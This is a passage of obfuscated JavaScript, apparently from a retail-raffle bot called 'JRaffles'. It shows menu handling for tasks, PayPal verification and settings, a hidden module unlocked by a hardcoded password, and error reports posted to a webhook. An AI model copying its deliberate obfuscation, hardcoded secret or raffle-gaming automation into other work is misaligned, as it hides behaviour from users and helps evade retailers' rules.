                                                        var _0x59738f = await _0x16395f(), _0x2db35d = await _0x3e65db();
                                                        return _0x397a11['shuffleTasks'] && await _0x437415(_0x2db35d), await _0x193ca7['function'](_0x193ca7, _0x2db35d, _0x59738f), _0x1c8dad();
                                                    }
                                                } else {
                                                    if (_0x3b60fe[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x2bc7d2(0x3e8), _0x1c8dad();
                                                    else {
                                                        if (_0x3b60fe[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x2c0a80 = _0x3b60fe[taskModule]['name'], _0x59738f = await _0x16395f();
                                                            await _0x368c6c(_0x2c0a80, _0x59738f);
                                                        } else {
                                                            if (_0x3b60fe[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x29daf7(_0x3b60fe[taskModule]['modules']);
                                                                var _0x193ca7 = _0x3b60fe[taskModule]['modules'][taskFunction];
                                                                return await _0x193ca7['function'](_0x193ca7), _0x1c8dad();
                                                            } else {
                                                                if (_0x3b60fe[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0x375901 = 0x0;
                                                                    for (const _0x21581a in _0x397a11) {
                                                                        console['log']('(' + _0x375901 + ')\x20' + _0x21581a + '\x20:\x20' + _0x397a11[_0x21581a]), _0x375901++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x375901 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0x5f4fe9 = await _0x2cc4a8();
                                                                    if (_0x5f4fe9 == _0x375901)
                                                                        return _0x1c8dad();
                                                                    console['clear'];
                                                                    var _0x304221 = 0x0;
                                                                    for (var _0x1d5a6e in _0x397a11) {
                                                                        if (_0x5f4fe9 == _0x304221) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x1d5a6e + '\x20:'), _0x397a11[_0x1d5a6e] = await _0x50f388(), _0xd8dc96['writeFileSync']('../settings.json', JSON['stringify'](_0x397a11));
                                                                            break;
                                                                        } else
                                                                            _0x304221++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0x2bc7d2(0xbb8), _0x1c8dad();
                                                                } else {
                                                                    if (_0x3b60fe[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0x3f0f91(), _0x1c8dad();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0x3b60fe[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x53a04e = await _0x2e6414();
                                                                            _0x53a04e == 'ModuleVoorDeBoys' ? (await _0x10f4bd(), await _0x2fe27b(), await afewFunction(_0x346456[_0xfc47a4], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x2bc7d2(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            await _0x1c8dad();
        } catch (_0x5b7d3d) {
            return console['log'](_0x5b7d3d), await _0x2bc7d2(0x3a98);
        }
}
;
_0x535b9c('JRaffles\x20' + _0x14595d), _0x3f0f91();
try {
    _0x5b76d6();
} catch (_0x3e9f15) {
    var _0x59399d = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x3b1bf1
            },
            {
                'name': 'Version',
                'value': '' + _0x14595d
            },
            {
                'name': 'Error',
                'value': '' + _0x3e9f15
            }
        ]
    }];
    const _0x50e662 = { 'embeds': _0x59399d };
    _0x5e696c(_0x8997ff, _0x50e662);
}